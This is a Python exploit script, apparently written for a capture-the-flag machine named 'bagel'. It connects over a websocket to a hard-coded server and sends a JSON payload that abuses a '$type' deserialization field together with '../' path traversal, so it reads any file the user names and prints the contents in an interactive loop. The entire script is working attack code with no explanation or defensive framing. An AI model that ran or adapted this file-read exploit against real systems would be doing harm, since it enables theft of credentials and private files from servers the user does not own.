import json
import websocket
import sys
from colorama import Fore, Style


def read_file(path):
    try:
        ws = websocket.WebSocket()
        ws.connect('ws://10.10.11.201:5000')
        grab = f"../../../..{path}"
        file = {"RemoveOrder": {"$type": "bagel_server.File, bagel", f"ReadFile": grab}}
        data = str(json.dumps(file))
        ws.send(data)
        result = ws.recv()
        print(Fore.BLUE + json.loads(result)['RemoveOrder']['ReadFile'] + Style.RESET_ALL)
    except Exception as e:
        print(e)


def main():
    while True:
        path = input('[+] file >> ')
        if 'exit' in path:
            sys.exit(0)
        read_file(path)


if __name__ == '__main__':
    main()
